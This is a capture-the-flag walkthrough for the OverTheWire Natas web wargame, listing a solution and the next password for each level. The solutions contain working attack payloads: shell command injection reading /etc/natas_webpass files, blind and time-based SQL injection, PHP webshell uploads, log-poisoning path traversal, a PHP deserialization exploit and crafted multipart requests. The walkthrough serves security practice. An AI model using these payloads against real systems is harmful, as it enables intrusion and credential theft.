___
Natas_0

```
Initial Creds for the Wargame
Username: natas0 | Password: natas0
```

	Solution: Inspect the Webpage -> Find it in comments 

	The_Next_Lvl_Password : 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

___________________________________________________

Natas_0  -> Natas_1

```
Right_Click is Blocked
```

	Solution: Use F12 instead -> Find the Password in Comments

	The_Next_Lvl_Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

________________________________________________________________
Natas_1 -> Natas_2

```
hidden img
```

	Solution: Inspect -> Review the code -> Find Hidden Img -> open-> note /files/pixel.png -> access /files -> /files/users.txt

	The_Next_Lvl_Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

________________________________________________________________
Natas_2 -> Natas_3

```
Always check /Robots.txt
```

	Solution: /robots.txt -> /s3cr3t/ -> /s3cr3t/users.txt

	The_Next_Lvl_Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

________________________________________________________________
Natas_3 -> Natas_4

```
Referer
```

	Solution: curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org --referer http://natas5.natas.labs.overthewire.org/


	The_Next_Lvl_Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

________________________________________________________________
Natas_4 -> Natas_5

	Solution:  BurpSuite -> Repeat request & add Cookie: loggedin=1

	The_Next_Lvl_Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

________________________________________________________________
Natas_5 -> Natas_6

	Solution:  find /includes/secret.inc -> find secret -> FOEIUWGHFEEUHOFUOIU -> submit secret

	The_Next_Lvl_Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

________________________________________________________________
Natas_6 -> Natas_7

	Solution: inspect -> found hint > /index.php?page=/etc/natas_webpass/natas8

	The_Next_Lvl_Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 

________________________________________________________________
Natas_7 -> Natas_8

	Solution: view source -> get encoded secret -> hex2bin-> reverse string -> base64 decode -> secret is oubWYf2kBq

	The_Next_Lvl_Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

________________________________________________________________
Natas_8 -> Natas_9

	Solution: ; cat /etc/natas_webpass/natas10

	The_Next_Lvl_Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

________________________________________________________________
Natas_9 -> Natas_10

	Solution: . /etc/natas_webpass/natas11#

	The_Next_Lvl_Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

________________________________________________________________
Natas_10 -> Natas_11

	Solution: view source -> analize the cookie, get the xor encryption key (it's eDWo) -> make new json, xor encrypt it -> base64 it -> change cookie-> get flag

	The_Next_Lvl_Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

________________________________________________________________
Natas_11 -> Natas_12

	Solution: inspect and change the file format from jpg to php -> upload php file that contains <?php echo file_get_contents("/etc/natas_webpass/natas13");?> -> visit given link to see your 'photo'

	The_Next_Lvl_Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

________________________________________________________________
Natas_12 -> Natas_13

	Solution: create file cat z.png a.php > r.png (png is 1x1 small img, php is <?php echo file_get_contents("/etc/natas_webpass/natas14");?> -> inspect and change .jpg to .php -> upload file
)

	The_Next_Lvl_Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

________________________________________________________________
Natas_13 -> Natas_14

	Solution: " OR 1=1 #

	The_Next_Lvl_Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

________________________________________________________________

Natas_14 -> Natas_15

```
Blind SQL Injection
```

	Solution: natas16" AND LENGTH(password)>32 # -> burp suite intruder  where first argument is 1-32 numbers and second argument is A-Z, a-z , 0-9 : username = natas16%22 + AND + BINARY + SUBSTRING %28 password %2C §2§ %2C 1 %29 + %3D %27 §a§ %27 %23

	The_Next_Lvl_Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

________________________________________________________________

Natas_15 -> Natas_16

	Solution: try $(grep E /etc/natas_webpass/natas17)Allah -> try $(grep e /etc/natas_webpass/natas17)Allah -> brute force

	The_Next_Lvl_Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

________________________________________________________________

Natas_16 -> Natas_17

	Solution: check for time based blind sql injection -> "natas18" AND SLEEP(5) -- -> "natas18" AND IF(ASCII(SUBSTRING(password, {index}, 1)) = {ascii_value}, SLEEP(5), 0) -- -> write py brute forcer

	The_Next_Lvl_Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

________________________________________________________________

Natas_17 -> Natas_18

	Solution: brute force admin's PHPSESSID -> ask chatGPt to write py code for brute forcing-> admin's PHPSESSID =119 

	The_Next_Lvl_Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

________________________________________________________________
Natas_18 -> Natas_19

	Solution: login e.g admin:test -> PHPSESSID is 34382d61646d696e -> hex decode -> 48-admin -> write brute forcer ->  {index}-admin -> hex encode-> brute force -> via burp suite send Admin PHPSESSID -> get password

	The_Next_Lvl_Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw

________________________________________________________________
Natas_19 -> Natas_20

	Solution: https://nils-maeurer.de/post/overthewire-natas20-21/

	The_Next_Lvl_Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

________________________________________________________________
Natas_20 -> Natas_21

	Solution: experimenter page -> burp suite intercept -> change request : delete Cookie PHPSESSID, add debug=''& align=left& fontsize=99%25& bgcolor=red& submit=Update&admin=1 -> get new PHPSESSID -> pass that sessid in real page

	The_Next_Lvl_Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

________________________________________________________________
Natas_21 -> Natas_22

	Solution: burp suite intercept -> add Get /?revelio -> get password

	The_Next_Lvl_Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

________________________________________________________________
Natas_22 -> Natas_23

	Solution: 10111iloveyou (checks 1/ if contains iloveyou and 2/ when starts with number > 10 compares as numbers, number can be anything > 10)

	The_Next_Lvl_Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

________________________________________________________________
Natas_23 -> Natas_24

	Solution: /?passwd[]=test

	The_Next_Lvl_Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

________________________________________________________________
Natas_24 -> Natas_25

	Solution: ? do directory traversal that causes error. -> look at log files -> edit user agent , add malicious php -> look at log file ( natas25_phpsessid.log) -> lang=....//....// ....//....//.... //var/www/natas/natas25/logs/natas25_1hr3tn0jegf8g1d4omolhf2g8h.log

	The_Next_Lvl_Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

________________________________________________________________
Natas_25 -> Natas_26

	Solution: construct php file

```
<?php

	class Logger {
	    private $logFile;
	    private $initMsg;
	    private $exitMsg;
    
	    function __construct(){
	        $this->initMsg="heyyyyyy\n";
		    $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
		    $this->logFile = "/var/www/natas/natas26/img/n0j.php";
	    }
	}

	$o = new Logger();
	print base64_encode(serialize($o))."\n";

?>
```
	 run it -> copy the output -> paste it in burp suite repeater in drawing = {paste here} -> visit /img/n0j.php


	The_Next_Lvl_Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

________________________________________________________________
Natas_26 -> Natas_27

	Sollution: create a user using burpsuite natas28+64*(%00)+a -> login natas28 with new login

	The_Next_Lvl_Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

________________________________________________________________
Natas_27 -> Natas_28

	Solution: https://github.com/javiunzu/natas/blob/master/natas28.py
https://www.youtube.com/watch?v=oWmfYgCYmCc

	The_Next_Lvl_Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

________________________________________________________________
Natas_28 -> Natas_29

	Solution: index.pl?file=|cat /etc/na?as_webpass/na?as30%00
	
	diff <(cat /etc/passwd) <(cat /e??/pas?wd) /there are the same/

	The_Next_Lvl_Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH


________________________________________________________________
Natas_29 -> Natas_30

	Solution: write py code to do request -> 
	session = requests.Session() 
	response = session.post(url, auth=auth, data={'username': 'natas31', 'password': ['"sqli" or 1', 4]})
	print(response.text)

	The_Next_Lvl_Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

________________________________________________________________
Natas_30 -> Natas_31

	Solution: POST /index.pl?/etc/natas_webpass/natas32 -> modify request to this
	

```
------WebKitFormBoundarynP0gviBjU2V6cTOF

Content-Disposition: form-data; name="file"

ARGV

------WebKitFormBoundarynP0gviBjU2V6cTOF

Content-Disposition: form-data; name="file"; filename="a.csv"

Content-Type: text/csv

1,2,
3,4,

------WebKitFormBoundarynP0gviBjU2V6cTOF

Content-Disposition: form-data; name="submit"

Upload

------WebKitFormBoundarynP0gviBjU2V6cTOF--

```


	The_Next_Lvl_Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

________________________________________________________________
Natas_31 -> Natas_32

	Solution: send this requests

```
POST /index.pl?ls%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------22445608112295
Content-Length: 402
Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
Connection: close
Referer: http://natas32.natas.labs.overthewire.org/
Cookie: __cfduid=deb7210e17b7391f9dd3bd09811da4bfd1557733438
Upgrade-Insecure-Requests: 1

-----------------------------22445608112295
Content-Disposition: form-data; name="file"

ARGV
-----------------------------22445608112295
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: application/vnd.ms-excel


-----------------------------22445608112295
Content-Disposition: form-data; name="submit"

Upload
-----------------------------22445608112295--

```

	then change first line -> POST /index.pl?./getpassword%20| HTTP/1.1

	The_Next_Lvl_Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

________________________________________________________________
Natas_32 -> Natas_33

	Solution: https://axcheron.github.io/writeups/otw/natas/#natas-33-solution

	The_Next_Lvl_Password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY

________________________________________________________________
Natas_33 -> Natas_34

 Congratulations! You have reached the end... for now. 

____________________________________________________________